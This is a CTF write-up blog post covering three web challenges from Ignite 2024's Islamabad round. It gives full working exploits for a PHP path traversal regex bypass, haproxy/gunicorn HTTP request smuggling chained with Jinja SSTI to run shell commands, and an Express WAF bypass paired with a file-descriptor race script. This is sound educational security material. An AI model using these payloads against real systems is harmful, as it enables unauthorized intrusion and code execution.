---
title: CTF web challenge writeups for Ignite Islamabad 24 regional round 
tags:
  - ignite-24
  - web
  - ctf
  - regional
categories:
  - CTF
  - Writeups
summary: Writeups for all web related challenges from Ignite 2024 regional round of Islamabad 
created: 2024-11-26
lastmod: 2024-11-26
image: https://github.com/user-attachments/assets/505ce24b-a239-465b-b2cd-ea90a6f43bbd
---

## readme | Easy

> The flag was in `.ht_flag.txt` file. 

This challenge was basically the upgraded version of the easy challenge from Karachi. The challenge was exactly similar except for one minor thing. The source code of the challenge is given as:

```php
<?php

function normalize($path)
{
    $parts = explode('/', $path);
    $safeParts = [];

    foreach ($parts as $part) {
        if ($part === '.' || $part === '') {
            continue;
        }
        if ($part === '..') {
            array_pop($safeParts);
        } else {
            $safeParts[] = $part;
        }
    }
    // Rebuild the path
    return implode('/', $safeParts);
}

if (isset($GET['source'])) {
    showsource(__FILE);
    exit();
}

if (isset($_GET['file'])) {
    $file = $_REQUEST['file'];

    if (!preg_match('/^.(php|flag)./', $file)) {
        $real_file = normalize($file);
        readfile($real_file);
    } else {
        die('nope');
    }
} else {
    ?>

    <h3><a target="_blank" href="/?source">Source?</a></h3>

    <form action="/" method="get" enctype="multipart/form-data">
        Select a file to download:
        <input type="text" name="file" id="file">
        <input type="submit" value="Download!" name="submit">
    </form>

    <?php
}
?>
```

While analyzing the code and comparing it with the challenge from Karachi, i came across the difference in both files which was the regex in the filter:
```
if (!preg_match('/^.(php|flag)./', $file)) {
```

Whilst, in **Karachi** challenge in regex, we had the `multiline` flag like this: `/^.(php|flag)./m`. This doesn't mean much except for the fact that we can use a newline character `\n` to bypass this regex. 

The actual solution for the Karachi challenge was that we can do a `Catastrophic Backtracking Attack` to provide a large string to PHP which would bypass the regex as well. I tried that for a while with no success. Then analyzing the code, the following part seems to be vulnerable:

```php
foreach ($parts as $part) {
    if ($part === '.' || $part === '') {
        continue;
    }
    if ($part === '..') {
        array_pop($safeParts);
    } else {
        $safeParts[] = $part;
    }
}
```

In the second condition, we are removing the last element of `$safeParts` array which means that if the element in array if `..` whatever the last character is will be removed. Combining this with the regex bypass earlier of `newline`. We can send an input such as:
```
\n/../index.php
```

This bypassed the filter and we can read the `index.php` file. The final script to read the flag:
```python
import requests


payload = "\n/../.ht_flag.txt"


r = requests.post(
    'http://3.142.89.90:32989?file=asd',
    data={
        'file': payload
    }
)


print(r.text)
```

## SMG | Medium

> This is related to HTTP Descync

The challenge contained a `haproxy` behind which a flask app is running. The web app is basically vulnerable to SSTI. The vulnerable function on the backend is:
```python
@app.post("/admin")
def admin():
    user_input = request.form.get('input')
    print(user_input, file=sys.stderr)
    if any(bl_item in user_input for bl_item in blacklist):
        return "Blocked input!"


    try:
        return render_template_string(f"Output: {user_input}")
    except Exception as e:
        return str(e)
```

The input from user is being directly passed through `render_template_string` function. This looks quite straight forward. However, `haproxy` doesn't let us access URL:
```conf
frontend http
    bind *:80
    default_backend web

    acl restricted_page path_sub -i admin
    http-request deny if restricted_page
    acl restricted_page path_sub %
    http-request deny if restricted_page
```

Morever, with second ACL condition, its also difficult to provide `URL-encoded` strings. Reading the code, we are using a very specific version of `gunicorn` in `Dockerfile`:
```Dockerfile
FROM haproxy:1.9.10

USER root

RUN apt update -y
RUN apt install -y python3 python3-pip

RUN pip3 install -v 'gunicorn<=20.0.4'
RUN pip3 install flask
```

The version `gunicorn<=20.0.4` is very specific here to be exact. Looking online, i came across an HTTP Desync in this very specific version. Reading the blogs, i found a request specific for `haproxy` with `gunicorn`:
```
GET / HTTP/1.1
Host: localhost
Content-Length: 68
Sec-Websocket-Key1: x

xxxxxxxxGET /admin HTTP/1.1
Host: localhost
Content-Length: 35

GET / HTTP/1.1
Host: localhost

```

The request worked. However, everytime you change the payload the `Content-Length` here needs to be very correctly specified. If this is wrong, this would result in error. The first content length header
of `68` starts from the letter `xxx..` and ends where the next request starts. While the second header of length `35` starts at the beginning of body which is at `GET` at the moment 
and it ends at the `\r\n\r\n`. 

The left up part is SSTI. Reading the filters, we can't use `{{` and `}}`. However, payloads like `{%%}` can still be used. The `{% with %}` tag can be used to get RCE:
```html
{% with a={} %}{% endwith %}
```

Initially i called `import_string` from `__globals__` but that doesn't work for some reason. So, lets go the old way of finding the `Popen` function first. Get the classes:
```python
{% with a="".__class__.__mro__[1].__subclasses__() %}{% print(a) %}{% endwith %}
```

This would result in a large output. Clean the output, store the list properly and the index of the `Popen` function. Once, you get the index, payload becomes simple:
```python
{% with a="".__class__.__mro__[1].__subclasses__()[213]('cat /flag*',shell=True,stdout=-1).communicate() %}{% print(a) %}{% endwith %}
```

With the final request would become:
```
GET / HTTP/1.1
Host: localhost:80
Content-Length: 261
Sec-Websocket-Key1: x

xxxxxxxxPOST /admin HTTP/1.1
Host: localhost
Content-Length: 177
Content-Type: application/x-www-form-urlencoded

input={% with a="".__class__.__mro__[1].__subclasses__()[213]('cat /flag*',shell=True,stdout=-1).communicate()
 %}{% print(a) %}{% endwith %}GET / HTTP/1.1
Host: localhost


```

## wtwaf | Hard

> Code Analysis & Race Condition. I wasn't able to solve this challenge within due time. And kudos to its author and team Sekai for all the help in solving this later on.

Reading the code, we had to exploit 3 things: 

* Bypass the `req.originalUrl.toLowerCase().startsWith("/admin")` statement.
* Bypass the WAF: `(item) => item && JSON.stringify(item).includes("flag")`
* Race conditon in `/admin/debug` call.

Initially, we need to bypass the middleware:
```javascript
app.use((req, res, next) => {
    if([req.body, req.headers, req.query].some(
        (item) => item && JSON.stringify(item).includes("flag")
    )) {
        return res.status(403).end();
    }

    if (req.originalUrl.toLowerCase().startsWith("/admin") && req.headers.authorization !== `Bearer ${ADMIN_AUTH}`) {
        return res.status(403).end();
    }

    next();
});
```

This would require us to do a bit of code analysis of `express.js`. The `req.originalUrl` is created as:
```javascript
req.originalUrl = req.orignalUrl || req.url
```

The `req.url` is the url after `GET` in http request. And the requests are resolved through pathname. The first condition can be bypassed by providing a full url after `GET`:
```
GET http://localhost/admin/debug HTTP/1.1
Host: localhost:3000
```

At the reading part we have:
```javascript
const file = req.query.file ?? "/etc/hostname";
console.log("file requesting: ", file)
const contents = await fsp.readFile(file);
```

The `file` parameter can be dictionary as extended parameters are not set to `false`. The `readFileSync` and similar functions such as `readFile` can accept a dictionary with a specified set of attributes. The `object` to read a file is:
```javascript
let obj = {}
obj['protocol'] = 'file:'
obj['href'] = 'a'
obj['hostname'] = ''
obj['pathname'] = '/flag.txt'
```

Furthermore, the value of `pathname` can be `urlencoded as well: 
```
GET http://localhost/admin/debig?file[href]=a&file[protocol]=file:&file[hostname]=&file[pathname]=/fl%2561g.txt HTTP/1.1
```

When the above url is requested, the file be read. However, an error will trigger at following line:
```javascript
if (file.includes("flag")) {
    return res.status(404).end();
}
```

Because now our parameter is an `object` and it doesn't have a function named `includes`. This is where the race conditions comes in. Since, the `readFile` function is being successfully called, a file descriptor must have opened as well for this. 
This is a very short window. If we can race the descriptor when the file is opened, we can read the flag. However, we can't get just one descriptor as the time in which it opens is way too short. To cope this, we can generate infinity descriptors and try to race one. 
This worked actually and the final poc would look like:

```python
import threading
import requests
import time
import socket

class EXPLOIT:

    __ENCODED = "/fl%2561g.txt"
    __TARGET = "http://localhost:3000"
    __DICTREAD = "file[href]=a&file[protocol]=file:&file[hostname]=&file[pathname]={}"
    __DESCRIPTPOR = "/proc/self/fd/26"

    def __init__(self):
        self.url = """{}/admin/debug?{}""".format(
            self.__TARGET,
            self.__DICTREAD
        ).format(
            self.__ENCODED
        )
        self.url2 = """{}/admin/debug?file={}""".format(
            self.__TARGET,
            self.__DESCRIPTPOR
        )

    def request(self, raw_data, wait=False):
        p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        p.connect(("192.168.2.69", 8000))
        p.send(raw_data)
        if wait:
            data = p.recv(5000)
            if "flag" in data.decode():
                print("Flag: ", data)
        p.close()

    def baby_maker(self, url):
        print("Started Baby Maker...")
        while True:
            t = threading.Thread(target=self.request, args=(url,))
            t.daemon = True
            t.start()

    def engage(self):
        url = b"GET "+ self.url.encode() + b" HTTP/1.1\r\nHost: localhost:8000\r\n\r\n"
        url2 = b"GET " + self.url2.encode() + b" HTTP/1.1\r\nHost: localhost:8000\r\n\r\n"

        t = threading.Thread(target=self.baby_maker, args=(url,))
        t.daemon = True
        t.start()

        while True:
            t2 = threading.Thread(target=self.request, args=(url2, True))
            t2.daemon = True
            t2.start()

if __name__ == "__main__":
    EXPLOIT().engage()
```
